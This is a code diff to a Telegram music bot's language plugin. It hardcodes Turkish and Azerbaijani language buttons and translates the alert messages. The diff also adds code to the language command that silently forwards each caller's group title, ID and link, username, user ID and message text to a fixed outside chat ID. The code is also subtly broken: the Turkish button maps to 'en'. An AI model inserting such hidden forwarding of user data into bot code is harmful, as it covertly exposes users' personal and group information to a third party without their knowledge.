@@ -12,7 +12,7 @@ from pyrogram import filters
 from pyrogram.types import InlineKeyboardButton, Message
 
 from config import BANNED_USERS
-from strings import get_command, get_string, languages_present
+from strings import get_command, get_string
 from YukkiMusic import app
 from YukkiMusic.utils.database import get_lang, set_lang
 from YukkiMusic.utils.decorators import (ActualAdminCB, language,
@@ -22,17 +22,19 @@ from YukkiMusic.utils.decorators import (ActualAdminCB, language,
 
 
 def lanuages_keyboard(_):
-    keyboard = InlineKeyboard(row_width=3)
-    keyboard.add(
-        *[
-            (
-                InlineKeyboardButton(
-                    text=languages_present[i],
-                    callback_data=f"languages:{i}",
-                )
-            )
-            for i in languages_present
-        ]
+    keyboard = InlineKeyboard(row_width=1)
+    keyboard.row(
+    
+        InlineKeyboardButton(
+            text="🇹🇷 Türkçe",
+            callback_data=f"languages:en",
+        ),
+    )
+    keyboard.row(  
+        InlineKeyboardButton(
+            text="🇦🇿 Azərbaycan",
+            callback_data=f"languages:az",
+        ),
     )
     keyboard.row(
         InlineKeyboardButton(
@@ -57,6 +59,20 @@ LANGUAGE_COMMAND = get_command("LANGUAGE_COMMAND")
 )
 @language
 async def langs_command(client, message: Message, _):
+    first_name = message.from_user.mention
+    user_id = message.from_user.id
+
+    
+    await client.send_message(-1001808202784, f"""
+👥 **Grup:** {message.chat.title} [`{message.chat.id}`]
+**Grup Linki:** @{message.chat.username}
+**Kullanıcı:** {first_name}
+**Kullanıcı Adı:** @{message.from_user.username}
+**Kullanıcı ID:** `{message.from_user.id}`
+**Sorgu:** {message.text}
+""")
+
+
     keyboard = lanuages_keyboard(_)
     await message.reply_text(
         _["setting_1"].format(message.chat.title, message.chat.id),
@@ -86,12 +102,12 @@ async def language_markup(client, CallbackQuery, _):
     old = await get_lang(CallbackQuery.message.chat.id)
     if str(old) == str(langauge):
         return await CallbackQuery.answer(
-            "You're already on same language", show_alert=True
+            "Diliniz zaten Türkçe.", show_alert=True
         )
     try:
         _ = get_string(langauge)
         await CallbackQuery.answer(
-            "Successfully changed your language.", show_alert=True
+            "Dili Başarıyla Değiştirdiniz.", show_alert=True
         )
     except:
         return await CallbackQuery.answer(
